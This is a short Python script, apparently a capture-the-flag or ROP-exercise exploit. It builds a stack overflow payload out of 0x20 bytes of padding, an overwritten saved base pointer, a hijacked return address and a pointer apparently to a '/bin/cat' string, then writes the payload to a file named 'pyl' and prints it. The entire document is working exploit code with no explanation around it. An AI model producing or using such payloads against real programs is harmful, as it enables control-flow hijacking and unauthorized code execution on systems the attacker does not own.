import struct

padding = b'A'*0x20
rbp = struct.pack('<q', 0x400741)
bincat = struct.pack('<q', 0x601060)
rip = struct.pack('<q', 0x40074b)

final = padding + rbp + rip + bincat

with open('pyl', 'wb') as f:
    f.write(final)

print(final)
